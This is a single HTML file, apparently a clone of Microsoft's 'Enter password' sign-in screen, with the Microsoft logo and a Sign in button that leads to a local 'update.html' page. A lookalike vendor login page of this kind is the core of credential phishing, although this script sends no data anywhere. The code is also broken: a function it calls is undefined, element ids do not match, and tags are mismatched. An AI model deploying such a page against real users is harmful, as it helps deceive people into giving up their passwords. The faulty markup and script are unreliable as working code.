<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Login UI</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
      integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container hidden" id="step2">
        <div class="login">
            <div class="logo">
                <img src="./microsoft-logo-removebg-preview.png" alt="Microsoft Logo">
            </div>
            <h4>Enter password</h1>
            <p id="userEmail" style="margin-bottom: 20px; color: #555;"></p>
            <input type="password" placeholder="Password" id="emailInput">
            <div class="options">
                <a href="#" style="color: black;"><span style="color: #0067b8;">Forgot password?</span></a><br>
                <a href="#">Other ways to sign in</a>
            </div>
            <a href="./update.html"><button onclick="handleNext()">Sign in</button></a>
        </div>
    </div>

    <script>
        function goToStep2() {
            const emailInput = document.getElementById('emailInput').value;
            if (!emailInput) {
                alert('Please enter your email, phone, or Skype.');
            } else {
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                document.getElementById('userEmail').textContent = emailInput;
            }
        }

        function submitForm() {
            const passwordInput = document.getElementById('passwordInput').value;
            if (!passwordInput) {
                alert('Please enter your password.');
            } else {
                alert('Login successful!');
            }
        }
    </script>
</body>
</html>
